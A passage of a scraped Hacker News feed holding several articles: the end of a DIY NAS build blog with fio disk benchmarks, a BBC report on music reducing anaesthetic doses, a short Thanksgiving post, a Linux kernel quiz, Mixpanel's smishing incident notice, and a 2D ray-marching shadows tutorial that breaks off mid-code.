      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;FIO&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;rust&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;32G&lt;/cell&gt;
        &lt;cell&gt;1474.00&lt;/cell&gt;
        &lt;cell&gt;326.00&lt;/cell&gt;
        &lt;cell&gt;368.00&lt;/cell&gt;
        &lt;cell&gt;544.00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;CrystalDiskMark&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;flash&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;4GiB&lt;/cell&gt;
        &lt;cell&gt;5858.89&lt;/cell&gt;
        &lt;cell&gt;50409.91&lt;/cell&gt;
        &lt;cell&gt;1104.64&lt;/cell&gt;
        &lt;cell&gt;956.70&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;CrystalDiskMark&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;flash&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;32GiB&lt;/cell&gt;
        &lt;cell&gt;4193.36&lt;/cell&gt;
        &lt;cell&gt;31047.36&lt;/cell&gt;
        &lt;cell&gt;635.42&lt;/cell&gt;
        &lt;cell&gt;946.20&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;CrystalDiskMark&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;rust&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;4GiB&lt;/cell&gt;
        &lt;cell&gt;5226.50&lt;/cell&gt;
        &lt;cell&gt;46239.01&lt;/cell&gt;
        &lt;cell&gt;756.23&lt;/cell&gt;
        &lt;cell&gt;655.32&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;CrystalDiskMark&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;rust&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;32GiB&lt;/cell&gt;
        &lt;cell&gt;3794.43&lt;/cell&gt;
        &lt;cell&gt;12809.33&lt;/cell&gt;
        &lt;cell&gt;759.38&lt;/cell&gt;
        &lt;cell&gt;677.02&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;What do I think these benchmarks and my use of the DIY NAS: 2026 Edition tell me? In the grand scheme of things, not a whole lot.&lt;/p&gt;
    &lt;p&gt;However, these benchmarks do back up what I expected: The DIY NAS: 2026 Edition is quite capable and more than ready to meet my storage needs. I especially like that the CrystalDiskMark benchmarks of the SMB shares were both faster than a SATA SSD, and the throughput to the share on the &lt;code&gt;flash&lt;/code&gt; pool practically saturated the NASâ 10GbE network connection.&lt;/p&gt;
    &lt;head rend="h4"&gt;FIO Tests&lt;/head&gt;
    &lt;p&gt;Every time I benchmark a NAS, I seem to either be refining what I tried in prior years or completely reinventing the wheel. As a result, I wouldnât recommend comparing these results with results that I shared in prior yearsâ DIY NAS build blogs. I havenât really put a ton of effort into developing a standard suite of benchmarks. Things in my homelab change enough between DIY NAS blogs that trying to create and maintain an environment for a standard suite of benchmarks is beyond what my budget, spare time, and attention span will allow.&lt;/p&gt;
    &lt;p&gt;Iâm going to paste these &lt;code&gt;fio&lt;/code&gt; commands here in the blog for my own use in future DIY NAS build blogs. If you wind up building something similar, these might be helpful to measure your new NASâ filesystemâs performance and compare it to mine!&lt;/p&gt;
    &lt;code&gt;## Random Write IOPS
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=128k --size=4G --readwrite=randwrite --ramp_time=10
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=128k --size=32G --readwrite=randwrite --ramp_time=10

## Random Read IOPS
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=128k --size=4G --readwrite=randread --ramp_time=10
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=128k --size=32G --readwrite=randread --ramp_time=10

## Sequential Write (MB/s)
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=4M --size=4G --readwrite=write --ramp_time=10
fio --randrepeat=1 --ioengine=libaio --direct=1 --name=test --filename=test --bs=4M --size=32G --readwrite=write --ramp_time=10

## Sequential Read (MB/s)
fio --randrepeat=1 --ioengine=libaio --direct=1  --name=test --filename=test --bs=4M --size=4G --readwrite=read --ramp_time=10
fio --randrepeat=1 --ioengine=libaio --direct=1  --name=test --filename=test --bs=4M --size=32G --readwrite=read --ramp_time=10
&lt;/code&gt;
    &lt;head rend="h3"&gt;Power Consumption&lt;/head&gt;
    &lt;p&gt;One not-so-obvious cost of running a DIY NAS is how much power it consumes. While I specifically tried to pick items that were efficient in terms of power consumption, itâs also important to realize that all the other bells and whistles on the awesome Topton N22 NAS motherboard consume power, too, and that the biggest consumer of power in a NAS is almost always the hard disk drives.&lt;/p&gt;
    &lt;p&gt;Thanks to my tinkering with home automation, I have a plethora of smart outlets which are capable of power monitoring. I used those smart outlets for most of my power monitoring. But I also have a Kill a Watt P400 that I also use for some of the shorter tests:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Power consumed during a handful of specific tasks: &lt;list rend="ul"&gt;&lt;item&gt;Idle while running TrueNAS&lt;/item&gt;&lt;item&gt;RAM Burn-in (~14 passes of Memtest86+)&lt;/item&gt;&lt;item&gt;An 8-hour throughput benchmark copying randomly sized files to the NAS using SMB.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Total consumed during the build, burn-in, and use of the DIY NAS: 2026 Edition.&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;Task&lt;/cell&gt;
        &lt;cell role="head"&gt;Duration&lt;/cell&gt;
        &lt;cell role="head"&gt;Max Wattage&lt;/cell&gt;
        &lt;cell role="head"&gt;Avg. Wattage&lt;/cell&gt;
        &lt;cell role="head"&gt;Total Consumption&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Boot&lt;/cell&gt;
        &lt;cell&gt;10 min.&lt;/cell&gt;
        &lt;cell&gt;200.00 W&lt;/cell&gt;
        &lt;cell&gt;120.00 W&lt;/cell&gt;
        &lt;cell&gt;0.02 kWh&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Idle&lt;/cell&gt;
        &lt;cell&gt;3 hr.&lt;/cell&gt;
        &lt;cell&gt;90.00 W&lt;/cell&gt;
        &lt;cell&gt;66.67 W&lt;/cell&gt;
        &lt;cell&gt;0.20 kWh&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;RAM Burn-in&lt;/cell&gt;
        &lt;cell&gt;18 hr.&lt;/cell&gt;
        &lt;cell&gt;104.00 W&lt;/cell&gt;
        &lt;cell&gt;91.67 W&lt;/cell&gt;
        &lt;cell&gt;1.65 kWh&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;SMB Benchmark of HDDs&lt;/cell&gt;
        &lt;cell&gt;8 hr.&lt;/cell&gt;
        &lt;cell&gt;107.00 W&lt;/cell&gt;
        &lt;cell&gt;85.00 W&lt;/cell&gt;
        &lt;cell&gt;0.68 kWh&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Total&lt;/cell&gt;
        &lt;cell&gt;108 hr.&lt;/cell&gt;
        &lt;cell&gt;237.80 W&lt;/cell&gt;
        &lt;cell&gt;66.49 W&lt;/cell&gt;
        &lt;cell&gt;7.17 kWh&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;What about an EconoNAS?&lt;/head&gt;
    &lt;p&gt;Shortly before prices skyrocketed, I decided I wasnât very interested in doing separate EconoNAS builds any longer. Several months ago, I realized that there were several off-the-shelf NAS machines that were more than capable of running TrueNAS, and they were selling at economical prices that couldnât be topped by a DIY approach. I will dive deeper into this in a future blog, eventually â¦ maybe?&lt;/p&gt;
    &lt;p&gt;All that being said, itâd be incredibly easy to make some compromises which result in the DIY NAS: 2026 Edition becoming quite a bit more economical. Hereâs a list of changes that I would consider to achieve a more budget-friendly build:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Different motherboard/CPU combo: N18 w/ N100 CPU (-$224), N18 w/ N150 CPU (-$214), or N22 w/ N150 CPU (-$180)&lt;/item&gt;
      &lt;item&gt;16GB of DDR5 RAM (-$39) instead of 32GB.&lt;/item&gt;
      &lt;item&gt;Thermal Right TL-C12015 Slim Fan instead of the Noctua NF-A12x25 (-$26)&lt;/item&gt;
      &lt;item&gt;Apevia SFX-AP500W Power Supply (-$104)&lt;/item&gt;
      &lt;item&gt;Skip the redundancy for the boot pool (-$22)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Altogether, these savings could add up to more than $400, which is pretty considerable! If you made all of these changes, youâd have something thatâs going to be nearly equivalent to the DIY NAS: 2026 Edition but at a fraction of the price.&lt;/p&gt;
    &lt;head rend="h2"&gt;What am I going to do with the DIY NAS: 2026 Edition?!&lt;/head&gt;
    &lt;p&gt;My DIY NAS is aging quite gracefully, but Iâve recently been wondering about replacing it. Shortly before ordering all the parts for the DIY NAS: 2026 Edition, I briefly considered using this yearâs DIY NAS build to replace my personal NAS. However, I decided not to do that. Then prices skyrocketed and I shelved the idea of building a replacement for my own NAS and I nearly shelved the idea of a DIY NAS in 2026!&lt;/p&gt;
    &lt;p&gt;So that begs the question, âWhat is Brian going to do with the DIY NAS: 2026 Edition?â&lt;/p&gt;
    &lt;p&gt;Iâm going to auction it off on the briancmosesdotcom store on eBay! Shortly after publishing this blog, Iâll list it on eBay. In response to skyrocketing prices for PC components, Iâm going to do a no-reserve auction. At the end of the auction, the highest bidder wins, and hopefully theyâll get a pretty good deal!&lt;/p&gt;
    &lt;head rend="h2"&gt;Final Thoughts&lt;/head&gt;
    &lt;p&gt;Overall, Iâm pleased with the DIY NAS: 2026 Edition. The Topton N22 motherboard is a significant improvement over last yearâs Topton N18 motherboard, primarily due to its extra two SATA ports. This provides 33.3% more gross storage capacity.&lt;/p&gt;
    &lt;p&gt;While testing, I found the Intel Core 3 N355 CPU somewhat excessive for basic NAS functions. However, the substantial untapped CPU horsepower offers luxurious performance potential. This makes the build compelling for anyone planning extensive self-hosting projects.&lt;/p&gt;
    &lt;p&gt;I have mixed feelings about the JONSBO N4 case. The four right-side drive bays lack SATA backplane connectivity. Without creative cabling solutions, individual drive replacement becomes challenging. However, the caseâs ~$125 price point compensates for this inconvenience. I anticipate that those the cost savings will justify the compromise for most builders. If I were to build the DIY NAS: 2026 Edition all over again, Iâd be tempted to use the JONSBO N3 case or even the JONSBO N6 which isnât quite obtainable, yet.&lt;/p&gt;
    &lt;p&gt;The DIY NAS: 2026 Edition delivers excellent performance and superior specifications. In my opinion, it represents better value than off-the-shelf alternatives:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;QNAP TS-832PX-4G ($880)&lt;/item&gt;
      &lt;item&gt;Asustor Lockerstor 8 AS6508T ($960)&lt;/item&gt;
      &lt;item&gt;UGREEN NASync DXP8800 ($1200)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Building your own NAS provides significant advantages. Years later, you can upgrade RAM, motherboard, case, or add PCI-e (x1) expansion cards. These off-the-shelf alternatives offer severely limited upgrade paths.&lt;/p&gt;
    &lt;p&gt;Is 2026 finally the year that you decide to build your DIY NAS? I hope that it is! Share your experience building your NAS in the comments below, or come tell us about it in the #diynas-and-homelab channel on the Butter, What?! Discord server!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.briancmoses.com/2025/11/diy-nas-2026-edition.html"/><published>2025-11-27T02:54:23+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46065698</id><title>Coq: The World's Best Macro Assembler? (2013) [pdf]</title><updated>2025-11-27T22:10:03.471048+00:00</updated><content/><link href="https://nickbenton.name/coqasm.pdf"/><published>2025-11-27T04:34:56+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46065817</id><title>Music eases surgery and speeds recovery, study finds</title><updated>2025-11-27T22:10:03.248148+00:00</updated><content>&lt;doc fingerprint="adb964f948bf9fcf"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Music eases surgery and speeds recovery, Indian study finds&lt;/head&gt;
    &lt;p&gt;Under the harsh lights of an operating theatre in the Indian capital, Delhi, a woman lies motionless as surgeons prepare to remove her gallbladder.&lt;/p&gt;
    &lt;p&gt;She is under general anaesthesia: unconscious, insensate and rendered completely still by a blend of drugs that induce deep sleep, block memory, blunt pain and temporarily paralyse her muscles.&lt;/p&gt;
    &lt;p&gt;Yet, amid the hum of monitors and the steady rhythm of the surgical team, a gentle stream of flute music plays through the headphones placed over her ears.&lt;/p&gt;
    &lt;p&gt;Even as the drugs silence much of her brain, its auditory pathway remains partly active. When she wakes up, she will regain consciousness more quickly and clearly because she required lower doses of anaesthetic drugs such as propofol and opioid painkillers than patients who heard no music.&lt;/p&gt;
    &lt;p&gt;That, at least, is what a new peer-reviewed study from Delhi's Maulana Azad Medical College and Lok Nayak Hospital suggests. The research, published in the journal Music and Medicine, offers some of the strongest evidence yet that music played during general anaesthesia can modestly but meaningfully reduce drug requirements and improve recovery.&lt;/p&gt;
    &lt;p&gt;The study focuses on patients undergoing laparoscopic cholecystectomy, the standard keyhole operation to remove the gallbladder. The procedure is short - usually under an hour - and demands a particularly swift, "clear-headed" recovery.&lt;/p&gt;
    &lt;p&gt;To understand why the researchers turned to music, it helps to decode the modern practice of anaesthesia.&lt;/p&gt;
    &lt;p&gt;"Our aim is early discharge after surgery," says Dr Farah Husain, senior specialist in anaesthesia and certified music therapist for the study. "Patients need to wake up clear-headed, alert and oriented, and ideally pain-free. With better pain management, the stress response is curtailed."&lt;/p&gt;
    &lt;p&gt;Achieving that requires a carefully balanced mix of five or six drugs that together keep the patient asleep, block pain, prevent memory of the surgery and relax the muscles.&lt;/p&gt;
    &lt;p&gt;In procedures like laparoscopic gallbladder removal, anaesthesiologists now often supplement this drug regimen with regional "blocks" - ultrasound-guided injections that numb nerves in the abdominal wall.&lt;/p&gt;
    &lt;p&gt;"General anaesthesia plus blocks is the norm," says Dr Tanvi Goel, primary investigator and a former senior resident of Maulana Azad Medical College. "We've been doing this for decades."&lt;/p&gt;
    &lt;p&gt;But the body does not take to surgery easily. Even under anaesthesia, it reacts: heart rate rises, hormones surge, blood pressure spikes. Reducing and managing this cascade is one of the central goals of modern surgical care. Dr Husain explains that the stress response can slow recovery and worsen inflammation, highlighting why careful management is so important.&lt;/p&gt;
    &lt;p&gt;The stress starts even before the first cut, with intubation - the insertion of a breathing tube into the windpipe.&lt;/p&gt;
    &lt;p&gt;To do this, the anaesthesiologist uses a laryngoscope to lift the tongue and soft tissues at the base of the throat, obtain a clear view of the vocal cords, and guide the tube into the trachea. It's a routine step in general anaesthesia that keeps the airway open and allows precise control of the patient's breathing while they are unconscious.&lt;/p&gt;
    &lt;p&gt;"The laryngoscopy and intubation are considered the most stressful response during general anaesthesia," says Dr Sonia Wadhawan, director-professor of anaesthesia and intensive care at Maulana Azad Medical College and supervisor of the study.&lt;/p&gt;
    &lt;p&gt;"Although the patient is unconscious and will remember nothing, their body still reacts to the stress with changes in heart rate, blood pressure, and stress hormones."&lt;/p&gt;
    &lt;p&gt;To be sure, the drugs have evolved. The old ether masks have vanished. In their place are intravenous agents - most notably propofol, the hypnotic made infamous by Michael Jackson's death but prized in operating theatres for its rapid onset and clean recovery. "Propofol acts within about 12 seconds," notes Dr Goel. "We prefer it for short surgeries like laparoscopic cholecystectomy because it avoids the 'hangover' caused by inhalational gases."&lt;/p&gt;
    &lt;p&gt;The team of researchers wanted to know whether music could reduce how much propofol and fentanyl (an opioid painkiller) patients required. Less drugs means faster awakening, steadier vital signs and reduced side effects.&lt;/p&gt;
    &lt;p&gt;So they designed a study. A pilot involving eight patients led to a full 11-month trial of 56 adults, aged roughly 20 to 45, randomly assigned to two groups. All received the same five-drug regimen: a drug that prevents nausea and vomiting, a sedative, fentanyl, propofol and a muscle relaxant. Both groups wore noise-cancelling headphones - but only one heard music.&lt;/p&gt;
    &lt;p&gt;"We asked patients to select from two calming instrumental pieces - soft flute or piano," says Dr Husain. "The unconscious mind still has areas that remain active. Even if the music isn't explicitly recalled, implicit awareness can lead to beneficial effects."&lt;/p&gt;
    &lt;p&gt;The results were striking.&lt;/p&gt;
    &lt;p&gt;Patients exposed to music required lower doses of propofol and fentanyl. They experienced smoother recoveries, lower cortisol or stress-hormone levels and a much better control of blood pressure during the surgery. "Since the ability to hear remains intact under anaesthesia," the researchers write, "music can still shape the brain's internal state."&lt;/p&gt;
    &lt;p&gt;Clearly, music seemed to quieten the internal storm. "The auditory pathway remains active even when you're unconscious," says Dr Wadhawan. "You may not remember the music, but the brain registers it."&lt;/p&gt;
    &lt;p&gt;The idea that the mind behind the anaesthetic veil is not entirely silent has long intrigued scientists. Rare cases of "intraoperative awareness" show patients recalling fragments of operating-room conversation.&lt;/p&gt;
    &lt;p&gt;If the brain is capable of picking up and remembering stressful experiences during surgery - even when a patient is unconscious - then it might also be able to register positive or comforting experiences, like music, even without conscious memory.&lt;/p&gt;
    &lt;p&gt;"We're only beginning to explore how the unconscious mind responds to non-pharmacological interventions like music," says Dr Husain. "It's a way of humanising the operating room."&lt;/p&gt;
    &lt;p&gt;Music therapy is not new to medicine; it has long been used in psychiatry, stroke rehabilitation and palliative care. But its entry into the intensely technical, machine-governed world of anaesthesia marks a quiet shift.&lt;/p&gt;
    &lt;p&gt;If such a simple intervention can reduce drug use and speed recovery - even modestly - it could reshape how hospitals think about surgical wellbeing.&lt;/p&gt;
    &lt;p&gt;As the research team prepares its next study exploring music-aided sedation, building on earlier findings, one truth is already humming through the data: even when the body is still and the mind asleep, it appears a few gentle notes can help the healing begin.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.bbc.com/news/articles/c231dv9zpz3o"/><published>2025-11-27T04:55:57+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46065955</id><title>Tell HN: Happy Thanksgiving</title><updated>2025-11-27T22:10:02.642378+00:00</updated><content>&lt;doc fingerprint="7f4ed38a148e83a2"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;I’ve been a part of this community for fifteen years. Despite the yearly bemoaning of HN’s quality compared to its mythical past, I’ve found that it’s the one community that has remained steadfast as a source of knowledge, cattiness, and good discussion.&lt;/p&gt;
      &lt;p&gt;Thank you @dang and @tomhow.&lt;/p&gt;
      &lt;p&gt;Here's to another year.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46065955"/><published>2025-11-27T05:21:16+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46066280</id><title>Linux Kernel Explorer</title><updated>2025-11-27T22:10:02.379453+00:00</updated><content>&lt;doc fingerprint="7391f92da42b0365"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;The kernel isn't a process—it's the system. It serves user processes, reacts to context, and enforces separation and control.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;The Kernel Is Not a Process: It's the always-present authority bridging hardware and software.&lt;/item&gt;
          &lt;item&gt;Serving the Process: Orchestrates syscalls, interrupts, and scheduling to keep user tasks running.&lt;/item&gt;
          &lt;item&gt;System of Layers: Virtual, mapped, isolated, and controlled—structure at runtime.&lt;/item&gt;
        &lt;/list&gt;
        &lt;div&gt;
          &lt;head rend="h4"&gt;📚 Study Files&lt;/head&gt;
          &lt;div&gt;
            &lt;p&gt;init/main.c&lt;/p&gt;
            &lt;p&gt;kernel/fork.c&lt;/p&gt;
            &lt;p&gt;include/linux/sched.h&lt;/p&gt;
            &lt;p&gt;arch/x86/kernel/entry_64.S&lt;/p&gt;
          &lt;/div&gt;
        &lt;/div&gt;
        &lt;div&gt;
          &lt;div&gt;
            &lt;div&gt;
              &lt;p&gt;1. What is the fundamental difference between the kernel and a process?&lt;/p&gt;
              &lt;div&gt;
                &lt;p&gt;A.The kernel is a special process with elevated privileges&lt;/p&gt;
                &lt;p&gt;B.The kernel is not a process—it's the system itself that serves processes&lt;/p&gt;
                &lt;p&gt;C.The kernel is just a library that processes link against&lt;/p&gt;
                &lt;p&gt;D.There is no difference; they are the same thing&lt;/p&gt;
              &lt;/div&gt;
            &lt;/div&gt;
            &lt;div&gt;
              &lt;p&gt;2. How does the kernel primarily serve user processes?&lt;/p&gt;
              &lt;div&gt;
                &lt;p&gt;A.By running as a background daemon&lt;/p&gt;
                &lt;p&gt;B.By orchestrating syscalls, interrupts, and scheduling&lt;/p&gt;
                &lt;p&gt;C.By providing a GUI interface&lt;/p&gt;
                &lt;p&gt;D.By compiling user code&lt;/p&gt;
              &lt;/div&gt;
            &lt;/div&gt;
            &lt;div&gt;
              &lt;p&gt;3. What characterizes the kernel's system of layers?&lt;/p&gt;
              &lt;div&gt;
                &lt;p&gt;A.Physical, tangible, and direct&lt;/p&gt;
                &lt;p&gt;B.Simple and flat with no hierarchy&lt;/p&gt;
                &lt;p&gt;C.Virtual, mapped, isolated, and controlled&lt;/p&gt;
                &lt;p&gt;D.User-accessible and modifiable&lt;/p&gt;
              &lt;/div&gt;
            &lt;/div&gt;
          &lt;/div&gt;
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://reverser.dev/linux-kernel-explorer"/><published>2025-11-27T06:17:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46066522</id><title>Mixpanel Security Breach</title><updated>2025-11-27T22:10:02.116636+00:00</updated><content>&lt;doc fingerprint="35be0cd749786243"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Our response to a recent security incident&lt;/head&gt;
    &lt;p&gt;Out of transparency and our desire to share with our community, this blog post contains key information about a recent security incident that impacted a limited number of our customers. On November 8th, 2025, Mixpanel detected a smishing campaign and promptly executed our incident response processes. We took comprehensive steps to contain and eradicate unauthorized access and secure impacted user accounts. We engaged external cybersecurity partners to remediate and respond to the incident.&lt;/p&gt;
    &lt;p&gt;We proactively communicated with all impacted customers. If you have not heard from us directly, you were not impacted. We continue to prioritize security as a core tenet of our company, products and services. We are committed to supporting our customers and communicating transparently about this incident.&lt;/p&gt;
    &lt;head rend="h2"&gt;What we did in response&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Secured affected accounts&lt;/item&gt;
      &lt;item&gt;Revoked all active sessions and sign-ins&lt;/item&gt;
      &lt;item&gt;Rotated compromised Mixpanel credentials for impacted accounts&lt;/item&gt;
      &lt;item&gt;Blocked malicious IP addresses&lt;/item&gt;
      &lt;item&gt;Registered IOCs in our SIEM platform&lt;/item&gt;
      &lt;item&gt;Performed global password resets for all Mixpanel employees&lt;/item&gt;
      &lt;item&gt;Engaged third-party forensics firm to advise on containment and eradication measures&lt;/item&gt;
      &lt;item&gt;Performed a forensic review of authentication, session, and export logs across impacted accounts&lt;/item&gt;
      &lt;item&gt;Implemented additional controls to detect and block similar activity going forward.&lt;/item&gt;
      &lt;item&gt;Engaged with law enforcement and external cybersecurity advisors&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;What you should know&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;If you received a communication from us, please review it for the steps we have taken to secure your account, as well as next steps.&lt;/item&gt;
      &lt;item&gt;If you did not receive a communication from us, no action is required. Your accounts were not impacted.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you have any questions about this incident, please contact support@mixpanel.com.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://mixpanel.com/blog/sms-security-incident/"/><published>2025-11-27T07:02:40+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46066695</id><title>Ray Marching Soft Shadows in 2D (2020)</title><updated>2025-11-27T22:10:01.882673+00:00</updated><content>&lt;doc fingerprint="3fae98912ba42222"&gt;
  &lt;main&gt;
    &lt;p&gt;Disclaimer: the demos on this page use WebGL features that aren’t available on some mobile devices.&lt;/p&gt;
    &lt;p&gt;A couple of weeks ago I tweeted a video of a toy graphics project (below). It’s not done, but a lot of people liked it which was surprising and fun! A few people asked how it works, so that’s what this post is about.&lt;/p&gt;
    &lt;p&gt;Under the hood it uses something called a distance field. A distance field is an image like the one below that tells you how far each pixel is from your shape. Light grey pixels are close to the shape and dark grey pixels are far from it.&lt;/p&gt;
    &lt;p&gt;When the demo starts up, it draws some text on a 2D canvas and generates a distance field of it. It uses a library I wrote that generates distance fields really quickly. If you’re curious how the library works, I wrote about that here.&lt;/p&gt;
    &lt;p&gt;Our lighting scheme works like this: when processing a particular pixel we consider a ray from it to the light, like so…&lt;/p&gt;
    &lt;p&gt;If the ray intersects a glyph, the pixel we’re shading must be in shadow because there’s something between it and the light.&lt;/p&gt;
    &lt;p&gt;The simplest way to check this would be to move along the ray in 1px increments, starting from the pixel we’re shading and ending at the light, repeatedly asking the distance field if we’re distance 0 from a shape. This would work, but it’d be really slow.&lt;/p&gt;
    &lt;p&gt;We could pick some specific length like 30px and move in increments of that size, but then we risk jumping over glyphs that are smaller than 30px. We might think we’re not in shadow when we should be.&lt;/p&gt;
    &lt;p&gt;Ray marching’s core idea is this: the distance field tells you how far you are from the closest glyph. You can safely advance along your ray by that distance without skipping over any glyphs.&lt;/p&gt;
    &lt;p&gt;Let’s walk through an example. We start as pictured above and ask the distance field how far we are from any glyph. Turns out in this case that the answer is 95px (pictured left). This means that we can move 95px along our ray without skipping over anything!&lt;/p&gt;
    &lt;p&gt;Now we’re a little closer to the light. We repeat the process until we hit the ascender of the b! If the b glyph weren’t there, we’d have kept going until we hit the light.&lt;/p&gt;
    &lt;p&gt;Below is a demo that shows the ray marching steps for a given pixel. The red box is the pixel we’re shading, and each circle along the ray represents a ray marching step and the distance from the scene at that step.&lt;/p&gt;
    &lt;p&gt;Try dragging the light and the pixel around to build an intuition for it.&lt;/p&gt;
    &lt;p&gt;Below is GLSL to implement this technique. It assumes you’ve defined a function &lt;code&gt;getDistance&lt;/code&gt; that samples the distance field.&lt;/p&gt;
    &lt;code&gt;vec2 rayOrigin = ...;
vec2 rayDirection = ...;

float rayProgress = 0;
while (true) {
  if (rayProgress &amp;gt; distance(rayOrigin, lightPosition)) {
    // We hit the light! This pixel is not in shadow.
    return 1.;
  }

  float sceneDist = getDistance(
    rayOrigin + rayProgress * rayDirection);
  if (sceneDist &amp;lt;= 0.) {
    // We hit a shape! This pixel is in shadow.
    return 0.;
  }

  rayProgress += sceneDist;
}
&lt;/code&gt;
    &lt;p&gt;It turns out that some pixels are really expensive to process. So in practice we use a for-loop instead of a while loop – that way we bail out if we’ve done too many steps. A common “slow case” in ray marching is when a ray is parallel to the edge of a shape in the scene…&lt;/p&gt;
    &lt;p&gt;The approach I’ve described so far will get you a scene that looks like the one below.&lt;/p&gt;
    &lt;p&gt;It’s cool, but the shadows are sharp which doesn’t look very good. The shadows in the demo look more like this…&lt;/p&gt;
    &lt;p&gt;One big disclaimer is that they’re not physically realistic! Real shadows look like hard shadows where the edges have been fuzzed. This approach does something slightly different: all pixels that were previously in shadow are still fully in shadow. We’ve just added a penumbra of partially shaded pixels around them.&lt;/p&gt;
    &lt;p&gt;The upside is that they’re pretty and fast to compute, and that’s what I care about! There are three “rules” involved in computing them.&lt;/p&gt;
    &lt;p&gt;Rule 1: The closer a ray gets to intersecting a shape, the more its pixel should be shadowed. In the image below there are two similar rays (their distances to the shape pictured in yellow and green). We want the one that gets closer to touching the corner to be more shadowed.&lt;/p&gt;
    &lt;p&gt;This is cheap to compute because the variable &lt;code&gt;sceneDist&lt;/code&gt; tells us how far we are from the closest shape at each ray marching step. So the smallest value of &lt;code&gt;sceneDist&lt;/code&gt; across all steps is a good approximation for the yellow and green lines in the image above.&lt;/p&gt;
    &lt;p&gt;Rule 2: if the pixel we’re shading is far from the point where it almost intersects a shape, we want the shadow to spread out more.&lt;/p&gt;
    &lt;p&gt;Consider two pixels along the ray above. One is closer to the almost-intersection and is lighter (its distance is the green line). The other is farther and darker (its distance is the yellow line). In general: the further a pixel is from its almost intersection, the more “in shadow” we should make it.&lt;/p&gt;
    &lt;p&gt;This is cheap to compute because the variable &lt;code&gt;rayProgress&lt;/code&gt; is the length of the green and yellow lines in the image above.&lt;/p&gt;
    &lt;p&gt;So: we previously returned &lt;code&gt;1.0&lt;/code&gt; for pixels that weren’t in shadow. To implement rules 1 and 2, we compute &lt;code&gt;sceneDist / rayProgress&lt;/code&gt; on each ray marching step, keep track of its minimum value, and return that instead.&lt;/p&gt;
    &lt;code&gt;vec2 rayOrigin = ...;
vec2 rayDirection = ...;
float rayProgress = 0.;
float stopAt = distance(samplePt, lightPosition);
float lightContribution = 1.;
for (int i = 0; i &amp;lt; 64; i++) {
  if (rayProgress &amp;gt; stopAt) {
    return lightContribution;
  }

  // `getDistance` samples our distance field texture.
  float sceneDist = getDistance(
    rayOrigin + rayProgress * rayDirection);
  if (sceneDist &amp;lt;= 0.) {
    // We hit a shape! This pixel is in shadow.
    return 0.;
  }

  lightContribution = min(
    lightContribution,
    sceneDist / rayProgress
  );

